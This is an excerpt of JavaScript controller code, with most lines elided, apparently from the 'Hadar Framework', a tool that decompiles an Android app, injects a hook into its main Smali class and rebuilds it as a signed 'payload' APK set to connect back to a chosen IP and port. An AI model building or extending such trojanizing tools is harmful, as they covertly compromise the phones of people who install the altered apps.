...
app.controller("AppCtrl", ($scope) => {
    ...
    if (architecture === 'ia32') {
        delayedLog('[!] WARNING: 32bit Systems Will Cease Support Once Apktool reaches v3.0.0.', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to Hadar Framework', CONSTANTS.logStatus.SUCCESS);
    ...
    $appCtrl.GenerateApk = async (apkFolder) => {
        ...
        CONSTANTS.features.forEach(function (feat) {
            if (checkedFeatures[feat.id] === false) {
                ...
                try {
                    ...
                    var hashMap = { Feature1: '0x208f5efd', Feature2: '0x208f5f90', Feature3: '0x208f60c8', Feature4: '0x208f5ee7', Feature5: '0x208f5f57' };
        ...
        // Build the Hadar Framework Payload APK
                        ...
                        xml2js.parseString(data, (err, result) => {
                            ...
                            const launcherPath = getLauncherPath(launcherActivity, apkFolder, (err, launcherPath) => {
                                ...
                                fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                                    ...
                                    delayedLog('[★] Injecting Hook into the Main Class Smali File...');
    ...
    $appCtrl.Build = (ip, port) => {
        ...
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                ...
                $appCtrl.Log('[¡] Hadar Framework Requires Java 11 to Decompile, Build and Sign Payloads.', CONSTANTS.logStatus.INFO);
                return;
